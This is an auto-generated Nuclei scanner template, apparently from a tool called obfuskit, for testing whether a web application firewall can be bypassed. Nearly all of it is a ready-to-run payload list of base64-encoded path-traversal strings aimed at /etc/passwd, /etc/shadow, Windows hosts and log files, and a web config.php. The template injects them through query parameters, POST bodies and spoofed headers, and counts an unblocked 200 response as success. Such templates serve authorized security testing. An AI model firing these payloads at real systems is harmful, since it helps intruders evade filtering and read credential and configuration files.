# Generated by obfuskit on 2025-07-25 03:42:37
# WAF Bypass Nuclei Template

id: waf-bypass-fileaccess-base64variants

info:
  name: "WAF Bypass - fileaccess using Base64Variants"
  author:
    - obfuskit
  severity: high
  description: "WAF bypass for fileaccess attacks using Base64Variants evasion techniques"
  tags:
    - waf
    - bypass
    - fileaccess
    - base64variants

payloads:
  payload:
    - "Li4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA=="
    - "Li4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA"
    - "Li4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==="
    - "Li4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA="
    - "L2V0Yy9wYXNzd2Q="
    - "L2V0Yy9wYXNzd2Q"
    - "L2V0Yy9wYXNzd2Q=="
    - "Li5cXC4uXFwuLlxcLi5cXGV0Y1xccGFzc3dk"
    - "Li5cXC4uXFwuLlxcLi5cXGV0Y1xccGFzc3dk="
    - "Li5cXC4uXFwuLlxcLi5cXGV0Y1xccGFzc3d"
    - "Li4vLi4vLi4vLi4vZXRjL3NoYWRvdw=="
    - "Li4vLi4vLi4vLi4vZXRjL3NoYWRvdw"
    - "Li4vLi4vLi4vLi4vZXRjL3NoYWRvdw==="
    - "Li4vLi4vLi4vLi4vZXRjL3NoYWRvdw="
    - "L2V0Yy9zaGFkb3c="
    - "L2V0Yy9zaGFkb3c"
    - "L2V0Yy9zaGFkb3c=="
    - "Li5cXC4uXFwuLlxcLi5cXGV0Y1xcc2hhZG93"
    - "Li5cXC4uXFwuLlxcLi5cXGV0Y1xcc2hhZG93="
    - "Li5cXC4uXFwuLlxcLi5cXGV0Y1xcc2hhZG9"
    - "QzpcV2luZG93c1xTeXN0ZW0zMlxkcml2ZXJzXGV0Y1xob3N0cw=="
    - "QzpcV2luZG93c1xTeXN0ZW0zMlxkcml2ZXJzXGV0Y1xob3N0cw"
    - "QzpcV2luZG93c1xTeXN0ZW0zMlxkcml2ZXJzXGV0Y1xob3N0cw==="
    - "QzpcV2luZG93c1xTeXN0ZW0zMlxkcml2ZXJzXGV0Y1xob3N0cw="
    - "Li5cXC4uXFwuLlxcLi5cXFdpbmRvd3NcXFN5c3RlbTMyXFxkcml2ZXJzXFxldGNcXGhvc3Rz"
    - "Li5cXC4uXFwuLlxcLi5cXFdpbmRvd3NcXFN5c3RlbTMyXFxkcml2ZXJzXFxldGNcXGhvc3Rz="
    - "Li5cXC4uXFwuLlxcLi5cXFdpbmRvd3NcXFN5c3RlbTMyXFxkcml2ZXJzXFxldGNcXGhvc3R"
    - "Li4vLi4vLi4vLi4vdmFyL3d3dy9odG1sL2NvbmZpZy5waHA="
    - "Li4vLi4vLi4vLi4vdmFyL3d3dy9odG1sL2NvbmZpZy5waHA"
    - "Li4vLi4vLi4vLi4vdmFyL3d3dy9odG1sL2NvbmZpZy5waHA=="
    - "L3Zhci93d3cvaHRtbC9jb25maWcucGhw"
    - "L3Zhci93d3cvaHRtbC9jb25maWcucGhw="
    - "L3Zhci93d3cvaHRtbC9jb25maWcucGh"
    - "Li5cXC4uXFwuLlxcLi5cXHZhclxcd3d3XFxodG1sXFxjb25maWcucGhw"
    - "Li5cXC4uXFwuLlxcLi5cXHZhclxcd3d3XFxodG1sXFxjb25maWcucGhw="
    - "Li5cXC4uXFwuLlxcLi5cXHZhclxcd3d3XFxodG1sXFxjb25maWcucGh"
    - "Li4vLi4vLi4vLi4vdmFyL2xvZy9zeXNsb2c="
    - "Li4vLi4vLi4vLi4vdmFyL2xvZy9zeXNsb2c"
    - "Li4vLi4vLi4vLi4vdmFyL2xvZy9zeXNsb2c=="
    - "L3Zhci9sb2cvc3lzbG9n"
    - "L3Zhci9sb2cvc3lzbG9n="
    - "L3Zhci9sb2cvc3lzbG9"
    - "Li5cXC4uXFwuLlxcLi5cXHZhclxcbG9nXFxzeXNsb2c="
    - "Li5cXC4uXFwuLlxcLi5cXHZhclxcbG9nXFxzeXNsb2c"
    - "Li5cXC4uXFwuLlxcLi5cXHZhclxcbG9nXFxzeXNsb2c=="
    - "QzpcV2luZG93c1xTeXN0ZW0zMlxMb2dGaWxlc1xXM1NWQzFcdV9leDE5MDEwMS5sb2c="
    - "QzpcV2luZG93c1xTeXN0ZW0zMlxMb2dGaWxlc1xXM1NWQzFcdV9leDE5MDEwMS5sb2c"
    - "QzpcV2luZG93c1xTeXN0ZW0zMlxMb2dGaWxlc1xXM1NWQzFcdV9leDE5MDEwMS5sb2c=="

requests:
  - method: GET
    path:
      - "/?test={{payload}}"
      - "/?q={{payload}}"
      - "/?search={{payload}}"
    matchers:
      - type: status
        status:
          - 200
          - 201
          - 202
      - type: status
        status:
          - 403
          - 406
          - 429
          - 451
        negative: true

  - method: POST
    path:
      - "/"
    headers:
      Content-Type: "application/x-www-form-urlencoded"
    body: "param={{payload}}&test={{payload}}"
    matchers:
      - type: status
        status:
          - 200
          - 201
          - 202
      - type: status
        status:
          - 403
          - 406
          - 429
          - 451
        negative: true

  - method: GET
    path:
      - "/"
    headers:
      X-Test-Header: "{{payload}}"
      User-Agent: "{{payload}}"
      X-Forwarded-For: "{{payload}}"
      X-Real-IP: "{{payload}}"
    matchers:
      - type: status
        status:
          - 200
          - 201
          - 202
      - type: status
        status:
          - 403
          - 406
          - 429
          - 451
        negative: true

